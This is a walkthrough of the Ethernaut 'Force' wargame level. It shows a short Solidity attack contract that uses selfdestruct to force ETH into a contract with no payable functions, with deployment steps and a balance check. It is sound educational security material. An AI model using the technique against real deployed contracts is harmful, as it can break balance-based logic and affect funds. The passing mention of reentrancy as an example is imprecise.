# Force - Ethernaut

## Objective

In this challenge, the contract does **not** contain any `receive` or `fallback` function and offers **no payable functions**. This makes it appear impossible to send ETH to the contract.
Your goal is to **force ETH into the contract's balance** and complete the level.

---

## Getting Started

1. Visit [ethernaut.openzeppelin.com](https://ethernaut.openzeppelin.com/)
2. Select the **"Force"** level
3. Click **“Get new instance”** and approve the transaction via MetaMask
4. Once the instance is deployed, the `contract` object is available in your browser console
5. Note the address of the deployed instance:

   ```js
   contract.address
   ```

---

## Walkthrough

The goal is to **send ETH forcibly** to the contract. Since it cannot receive ETH via normal means (no payable functions), we use the Solidity `selfdestruct()` function, which **forces** a balance transfer even if the recipient contract does not support receiving ETH.

### Step 1: Write the Exploit Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract ForceAttack {
    constructor() public payable {}

    function attack(address payable target) public {
        selfdestruct(target);
    }
}
```

**Explanation:**

* `constructor() public payable {}`
  This allows the contract to receive ETH at deployment.

* `attack(address payable target)`
  A public function that receives the Ethernaut instance address as input.

* `selfdestruct(target);`
  Destroys the current contract and forcibly transfers its ETH balance to `target`.
  Even if the target contract lacks any `payable` function, this transfer will succeed.

### Step 2: Deploy the Contract

Use [Remix](https://remix.ethereum.org/) or any Solidity IDE:

* Paste the `ForceAttack` contract
* Compile it with Solidity 0.6.0
* Set the **value** (e.g., `1 wei`) during deployment
* Deploy using **Injected Web3** environment (for MetaMask)
* Ensure you have selected the appropriate testnet (e.g., Goerli)

### Step 3: Call the Attack Function

After deploying, interact with the `attack()` function:

* Pass the address of your Ethernaut instance:

  ```solidity
  attack("0xInstanceAddress")
  ```

This will trigger `selfdestruct` and send the contract's ETH to the target.

### Step 4: Verify the Transfer

Use browser console or web3 to verify the contract now has ETH:

```js
await web3.eth.getBalance(contract.address)
```

The output should be greater than 0 (in wei).

---

## What You Learn

This level demonstrates how **ETH can be forcibly sent** to a smart contract using `selfdestruct`. Key takeaways:

* Contracts can receive ETH **even if they don't accept it explicitly**.
* The `selfdestruct` opcode can bypass Solidity-level protections by forcing a balance transfer.
* When building smart contracts, **designing for unexpected ETH transfers is critical** (e.g., reentrancy, balance-based logic).

---

## Resources Used

* [Ethernaut Game](https://ethernaut.openzeppelin.com/)
* [Solidity Docs - selfdestruct](https://docs.soliditylang.org/en/v0.6.12/control-structures.html#selfdestruct)